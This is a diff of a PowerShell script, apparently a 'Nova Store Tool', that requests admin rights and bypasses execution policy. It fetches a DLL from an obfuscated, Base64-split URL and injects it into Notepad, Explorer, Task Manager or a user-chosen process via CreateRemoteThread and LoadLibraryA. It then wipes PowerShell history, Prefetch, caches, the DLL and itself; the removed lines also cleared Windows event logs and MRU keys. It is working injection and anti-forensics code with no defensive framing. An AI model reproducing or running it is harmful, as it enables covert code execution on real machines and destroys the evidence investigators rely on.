@@ -3,6 +3,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     try {
         Start-Process powershell.exe -Verb RunAs -ArgumentList (
             "-NoProfile",
+            "-NoExit",
             "-ExecutionPolicy Bypass",
             "-File `"$PSCommandPath`""
         )
@@ -10,9 +11,11 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     }
     catch {
         Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
+        Read-Host "Press Enter to exit"
         exit 1
     }
 }
+
 # === Fixed LookupFunc ===
 function LookupFunc {
     Param ($moduleName, $functionName)
@@ -25,7 +28,6 @@ function LookupFunc {
     public static extern IntPtr GetModuleHandle(string lpModuleName);
 '@
     
-    # Check if type already exists to avoid errors on re-run within same session
     if (-not ([System.Management.Automation.PSTypeName]'Win32.Kernel32').Type) {
         $kernel32 = Add-Type -MemberDefinition $signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
     } else {
@@ -35,6 +37,7 @@ function LookupFunc {
     $hModule = $kernel32::GetModuleHandle($moduleName)
     return $kernel32::GetProcAddress($hModule, $functionName)
 }
+
 function getDelegateType {
     Param (
         [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
@@ -61,8 +64,6 @@ function getDelegateType {
     ).SetImplementationFlags('Runtime, Managed')
     return $type.CreateType()
 }
-# === Hidden DLL URL (Obfuscated as Hex Byte Array) ===
-$dllUrl = [Text.Encoding]::UTF8.GetString([byte[]](0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x66,0x69,0x6c,0x65,0x73,0x2e,0x63,0x61,0x74,0x62,0x6f,0x78,0x2e,0x6d,0x6f,0x65,0x2f,0x31,0x77,0x6c,0x76,0x71,0x63,0x2e,0x64,0x6c,0x6c))
 
 # === 1. Clear Temp Folder ===
 Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
@@ -74,10 +75,35 @@ try {
 catch {
     Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
 }
+
 # === 2. Download DLL to %TEMP% with Random Name ===
 $randomGuid = [System.Guid]::NewGuid().ToString()
 $dllFileName = "$randomGuid.dll"
 $dllPath = Join-Path $env:TEMP $dllFileName
+
+# --- Obfuscated URL ---
+$urlPart1 = "https://raw."
+$urlPart2 = "githubusercon"
+$urlPart3 = "tent.com/nova"
+$urlPart4 = "xstorex/Premi"
+$urlPart5 = "um/main/Nov"
+$urlPart6 = "a_Premium.d"
+$urlPart7 = "ll"
+
+$encodedUrl = @(
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart1)),
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart2)),
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart3)),
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart4)),
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart5)),
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart6)),
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart7))
+)
+
+$decodedParts = $encodedUrl | ForEach-Object {
+    [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))
+}
+$dllUrl = $decodedParts -join ""
 
 try {
     Write-Host "[+] Downloading DLL..." -ForegroundColor Cyan
@@ -117,10 +143,12 @@ catch {
     }
     catch {
         Write-Host "[!] All download methods failed: $($_.Exception.Message)" -ForegroundColor Red
+        Read-Host "Press Enter to exit"
         exit 1
     }
 }
-# === ตรวจสอบไฟล์ DLL ก่อนทำการ Inject ===
+
+# === ตรวจสอบไฟล์ DLL ===
 try {
     $fileInfo = [System.IO.File]::ReadAllBytes($dllPath)
     if ($fileInfo.Length -lt 1024) {
@@ -132,59 +160,199 @@ catch {
     Write-Host "[!] Could not verify DLL: $($_.Exception.Message)" -ForegroundColor Yellow
 }
 
-# === ค้นหา RuntimeBroker.exe ที่กำลังทำงานอยู่ หรือใช้ Notepad เป็น Fallback ===
+# === Process Selection Menu (Interactive) ===
+Clear-Host
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "    NOVA STORE TOOL - SELECT TARGET" -ForegroundColor Yellow
+Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "[+] Looking for RuntimeBroker.exe process..." -ForegroundColor Yellow
+Write-Host "Select target process:" -ForegroundColor White
+Write-Host ""
+Write-Host "  [1] Notepad" -ForegroundColor Green
+Write-Host "  [2] Task Manager (Taskmgr)" -ForegroundColor Green
+Write-Host "  [3] Explorer" -ForegroundColor Green
+Write-Host "  [4] RuntimeBroker" -ForegroundColor Green
+Write-Host "  [5] Enter custom process name" -ForegroundColor Green
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan
 
 $proc = $null
-$targetProcess = "RuntimeBroker"
-$targetExe = "RuntimeBroker.exe"
+$targetProcess = ""
+$targetExe = ""
+$validChoice = $false
 
-# 1. ลองค้นหา RuntimeBroker ที่กำลังทำงานอยู่
-try {
-    $existingProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+do {
+    Write-Host ""
+    $choice = Read-Host "Enter choice (1-5)"
+    Write-Host ""
     
-    if ($existingProc) {
-        Write-Host "[+] Found existing RuntimeBroker.exe (PID: $($existingProc.Id))" -ForegroundColor Green
-        $proc = $existingProc
-    }
-} catch {
-    Write-Host "[!] Could not find existing RuntimeBroker process" -ForegroundColor Yellow
-}
-
-# 2. ถ้าไม่เจอ ให้ลองเปิด Notepad แทน
-if (-not $proc) {
-    Write-Host "[!] RuntimeBroker.exe not found or not running" -ForegroundColor Yellow
-    Write-Host "[+] Using Notepad.exe as target process instead..." -ForegroundColor Cyan
-    
-    try {
-        $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
-        $targetProcess = "notepad"
-        $targetExe = "notepad.exe"
-        
-        Start-Sleep -Seconds 2
-        $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
-        
-        if (-not $proc) {
-            Write-Host "[!] Failed to start Notepad.exe" -ForegroundColor Red
-            exit 1
+    switch ($choice) {
+        "1" {
+            $targetProcess = "notepad"
+            $targetExe = "notepad.exe"
+            
+            try {
+                $existingProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1
+                if ($existingProc) {
+                    Write-Host "[+] Found existing Notepad.exe (PID: $($existingProc.Id))" -ForegroundColor Green
+                    $proc = $existingProc
+                } else {
+                    Write-Host "[+] Starting Notepad.exe..." -ForegroundColor Cyan
+                    $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
+                    Start-Sleep -Seconds 2
+                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
+                }
+                $validChoice = $true
+            }
+            catch {
+                Write-Host "[!] Failed to start Notepad.exe: $($_.Exception.Message)" -ForegroundColor Red
+            }
         }
-        Write-Host "[+] Successfully launched Notepad.exe (PID: $($proc.Id))" -ForegroundColor Green
+        "2" {
+            $targetProcess = "Taskmgr"
+            $targetExe = "taskmgr.exe"
+            
+            try {
+                $existingProc = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue | Select-Object -First 1
+                if ($existingProc) {
+                    Write-Host "[+] Found existing Task Manager (PID: $($existingProc.Id))" -ForegroundColor Green
+                    $proc = $existingProc
+                } else {
+                    Write-Host "[+] Starting Task Manager..." -ForegroundColor Cyan
+                    $proc = Start-Process -FilePath "taskmgr.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
+                    Start-Sleep -Seconds 3
+                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
+                }
+                $validChoice = $true
+            }
+            catch {
+                Write-Host "[!] Failed to start Task Manager: $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+        "3" {
+            $targetProcess = "explorer"
+            $targetExe = "explorer.exe"
+            
+            try {
+                $proc = Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Select-Object -First 1
+                if ($proc) {
+                    Write-Host "[+] Found Explorer.exe (PID: $($proc.Id))" -ForegroundColor Green
+                    $validChoice = $true
+                } else {
+                    Write-Host "[!] Explorer process not found. Starting new instance..." -ForegroundColor Yellow
+                    $proc = Start-Process -FilePath "explorer.exe" -PassThru -ErrorAction Stop
+                    Start-Sleep -Seconds 2
+                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
+                    $validChoice = $true
+                }
+            }
+            catch {
+                Write-Host "[!] Failed to find or start Explorer: $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+        "4" {
+            $targetProcess = "RuntimeBroker"
+            $targetExe = "RuntimeBroker.exe"
+            
+            try {
+                $proc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+                if ($proc) {
+                    Write-Host "[+] Found RuntimeBroker.exe (PID: $($proc.Id))" -ForegroundColor Green
+                    $validChoice = $true
+                } else {
+                    Write-Host "[!] RuntimeBroker not found. Using Notepad as fallback..." -ForegroundColor Yellow
+                    $targetProcess = "notepad"
+                    $targetExe = "notepad.exe"
+                    $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
+                    Start-Sleep -Seconds 2
+                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
+                    $validChoice = $true
+                }
+            }
+            catch {
+                Write-Host "[!] Failed to find RuntimeBroker: $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+        "5" {
+            Write-Host "Enter process name (e.g., chrome, winword, excel):" -ForegroundColor Yellow
+            $customProcess = Read-Host
+            if ($customProcess) {
+                $targetProcess = $customProcess
+                $targetExe = "$customProcess.exe"
+                
+                try {
+                    $proc = Get-Process -Name $customProcess -ErrorAction SilentlyContinue | Select-Object -First 1
+                    if ($proc) {
+                        Write-Host "[+] Found $targetExe (PID: $($proc.Id))" -ForegroundColor Green
+                        $validChoice = $true
+                    } else {
+                        Write-Host "[!] Process '$customProcess' not found." -ForegroundColor Yellow
+                        Write-Host "Would you like to start it? (y/n):" -ForegroundColor Yellow
+                        $startChoice = Read-Host
+                        if ($startChoice -eq 'y' -or $startChoice -eq 'Y') {
+                            Write-Host "[+] Starting $targetExe..." -ForegroundColor Cyan
+                            $proc = Start-Process -FilePath $targetExe -WindowStyle Normal -PassThru -ErrorAction Stop
+                            Start-Sleep -Seconds 2
+                            $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
+                            $validChoice = $true
+                        } else {
+                            Write-Host "[!] Skipped starting process. Please try again." -ForegroundColor Yellow
+                        }
+                    }
+                }
+                catch {
+                    # แก้ไขจุดนี้ - ใช้ ${customProcess} แทน $customProcess
+                    Write-Host "[!] Failed to find or start ${customProcess}: $($_.Exception.Message)" -ForegroundColor Red
+                }
+            }
+        }
+        default {
+            Write-Host "[!] Invalid choice. Please enter a number between 1-5." -ForegroundColor Red
+        }
     }
-    catch {
-        Write-Host "[!] Failed to start Notepad.exe: $($_.Exception.Message)" -ForegroundColor Red
-        exit 1
+    
+    if (-not $validChoice) {
+        Write-Host "[!] Failed to get a valid process." -ForegroundColor Red
+        Write-Host "Press any key to try again..." -ForegroundColor Yellow
+        Read-Host
+        Clear-Host
+        Write-Host "========================================" -ForegroundColor Cyan
+        Write-Host "    NOVA STORE TOOL - SELECT TARGET" -ForegroundColor Yellow
+        Write-Host "========================================" -ForegroundColor Cyan
+        Write-Host ""
+        Write-Host "Select target process:" -ForegroundColor White
+        Write-Host ""
+        Write-Host "  [1] Notepad" -ForegroundColor Green
+        Write-Host "  [2] Task Manager (Taskmgr)" -ForegroundColor Green
+        Write-Host "  [3] Explorer" -ForegroundColor Green
+        Write-Host "  [4] RuntimeBroker" -ForegroundColor Green
+        Write-Host "  [5] Enter custom process name" -ForegroundColor Green
+        Write-Host ""
+        Write-Host "========================================" -ForegroundColor Cyan
     }
+} while (-not $validChoice -or -not $proc)
+
+# ตรวจสอบ process
+if (-not $proc) {
+    Write-Host "[!] No target process available. Exiting..." -ForegroundColor Red
+    Read-Host "Press Enter to exit"
+    exit 1
 }
 
-# 3. ถ้ายังไม่มี process ให้ error
-if (-not $proc) {
-    Write-Host "[!] No target process available" -ForegroundColor Red
+try {
+    $proc = Get-Process -Id $proc.Id -ErrorAction Stop
+} catch {
+    Write-Host "[!] Process died or is no longer accessible. Exiting..." -ForegroundColor Red
+    Read-Host "Press Enter to exit"
     exit 1
 }
 
 $pid1 = $proc.Id
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Green
 Write-Host "[+] Target: $targetProcess (PID: $pid1) [Admin Context]" -ForegroundColor Green
+Write-Host "========================================" -ForegroundColor Green
+Write-Host ""
 
 # === Injection ===
 try {
@@ -203,50 +371,45 @@ try {
         (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))
     )
     
-    $LoadLibraryADelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-        (LookupFunc kernel32.dll LoadLibraryA),
-        (getDelegateType @([String]) ([IntPtr]))
-    )
-    
     $CreateRemoteThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
         (LookupFunc kernel32.dll CreateRemoteThread),
         (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
     )
     
-    # PROCESS_ALL_ACCESS (0x001F0FFF)
+    Write-Host "[+] Opening process handle..." -ForegroundColor Cyan
     $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
     
     if ($hProcess -eq [IntPtr]::Zero) {
         Write-Host "[!] Failed to open process handle. Access Denied?" -ForegroundColor Red
-        Write-Host "[!] Trying with PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE (0x0002 | 0x0008 | 0x0020)..." -ForegroundColor Yellow
-        
-        # ลองใช้สิทธิ์น้อยลง
-        $hProcess = $OpenProcessDelegate.Invoke(0x002A, 0, $pid1)  # 0x002A = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
+        Write-Host "[!] Trying with limited permissions..." -ForegroundColor Yellow
+        $hProcess = $OpenProcessDelegate.Invoke(0x002A, 0, $pid1)
         
         if ($hProcess -eq [IntPtr]::Zero) {
             Write-Host "[!] Still failed to open process handle" -ForegroundColor Red
+            Read-Host "Press Enter to exit"
             exit 1
         }
     }
     Write-Host "[+] Process Handle: $hProcess" -ForegroundColor Green
     
-    # Allocate memory for the DLL path string
+    Write-Host "[+] Allocating memory in target process..." -ForegroundColor Cyan
     $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
     if ($addr -eq [IntPtr]::Zero) {
         Write-Host "[!] Failed to allocate memory" -ForegroundColor Red
+        Read-Host "Press Enter to exit"
         exit 1
     }
     Write-Host "[+] Allocated Memory: $addr" -ForegroundColor Green
     
-    # Convert DLL path to bytes
     [Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
     [IntPtr]$outSize = [IntPtr]::Zero
     
-    # Write DLL path to remote process
+    Write-Host "[+] Writing DLL path to target process..." -ForegroundColor Cyan
     $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
     
     if (-not $res) {
         Write-Host "[!] Failed to write memory" -ForegroundColor Red
+        Read-Host "Press Enter to exit"
         exit 1
     }
     Write-Host "[+] Memory Written: $res" -ForegroundColor Green
@@ -254,13 +417,20 @@ try {
     $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
     Write-Host "[+] LoadLibraryA Address: $loadLibAddr" -ForegroundColor Green
     
-    # Create remote thread to load the DLL
+    Write-Host "[+] Creating remote thread to load DLL..." -ForegroundColor Cyan
     $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
     
     if ($hThread -ne [IntPtr]::Zero) {
-        Write-Host "[✓] Injection successful (Thread Handle: $hThread)" -ForegroundColor Green
+        Write-Host ""
+        Write-Host "========================================" -ForegroundColor Green
+        Write-Host "[✓] INJECTION SUCCESSFUL!" -ForegroundColor Green
+        Write-Host "[✓] Thread Handle: $hThread" -ForegroundColor Green
+        Write-Host "[✓] DLL loaded into $targetProcess (PID: $pid1)" -ForegroundColor Green
+        Write-Host "========================================" -ForegroundColor Green
     } else {
+        Write-Host ""
         Write-Host "[!] Injection failed (CreateRemoteThread returned Zero)" -ForegroundColor Red
+        Write-Host "[!] Try selecting a different process." -ForegroundColor Yellow
     }
 }
 catch {
@@ -269,22 +439,23 @@ catch {
 }
 
 # === Enhanced Cleanup & Anti-Forensics ===
-Write-Host "[+] Starting deep cleanup..." -ForegroundColor Cyan
+Write-Host ""
+Write-Host "[+] Starting cleanup..." -ForegroundColor Cyan
 
-# 1. Clear PowerShell History (Memory & File Content)
+# Clear PowerShell History
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
 $histPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $histPath) { 
     try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
 }
 
-# 2. Clear Recent Files
+# Clear Recent Files
 $recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
 if (Test-Path $recentPath) {
     Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
 }
 
-# 3. Clear Jump Lists
+# Clear Jump Lists
 $jumpListPaths = @(
     (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
     (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
@@ -295,7 +466,7 @@ foreach ($path in $jumpListPaths) {
     }
 }
 
-# 4. Clear Prefetch (Multiple Attempts to Catch Re-created Files)
+# Clear Prefetch
 $prefetchPath = "C:\Windows\Prefetch"
 for ($i = 0; $i -lt 3; $i++) {
     Start-Sleep -Seconds 1
@@ -304,51 +475,28 @@ for ($i = 0; $i -lt 3; $i++) {
     }
 }
 
-# 5. Clear INetCache (IE/Edge Cache)
+# Clear INetCache
 $ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
 if (Test-Path $ieCache) {
     Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 }
 
-# 6. Clear Temp Folder Again (in case anything was recreated)
+# Clear Temp Folder
 $tempDir = $env:TEMP
 Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 
-# 7. Clear Registry MRU Keys (User-specific)
-$mruKeys = @(
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
-    "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
-)
-foreach ($key in $mruKeys) {
-    if (Test-Path $key) {
-        Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
-        New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
-    }
-}
-
-# 8. Clear Event Logs (Requires Admin)
-$logNames = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Sysmon/Operational")
-foreach ($logName in $logNames) {
-    try {
-        wevtutil cl $logName 2>$null
-    } catch {
-        # Ignore errors if log doesn't exist or access denied
-    }
-}
-
-# 9. Delete the random DLL from Temp
+# Delete DLL
 Start-Sleep -Seconds 1
 if (Test-Path $dllPath) { 
     try { 
         Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] DLL file removed: $dllPath" -ForegroundColor Green
+        Write-Host "[+] DLL file removed" -ForegroundColor Green
     } catch {
-        Write-Host "[!] Could not remove DLL file: $($_.Exception.Message)" -ForegroundColor Yellow
+        Write-Host "[!] Could not remove DLL file" -ForegroundColor Yellow
     }
 }
 
-# 10. Delete the script itself
+# Delete script
 if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
     try {
         Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
@@ -358,9 +506,12 @@ if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
     }
 }
 
-# 11. Force GC and wait a bit to let system settle
 [GC]::Collect()
 [GC]::WaitForPendingFinalizers()
 Start-Sleep -Seconds 2
+
 Write-Host "[+] Cleanup complete" -ForegroundColor Green
+Write-Host ""
+Write-Host "Press Enter to exit..."
+Read-Host
 exit
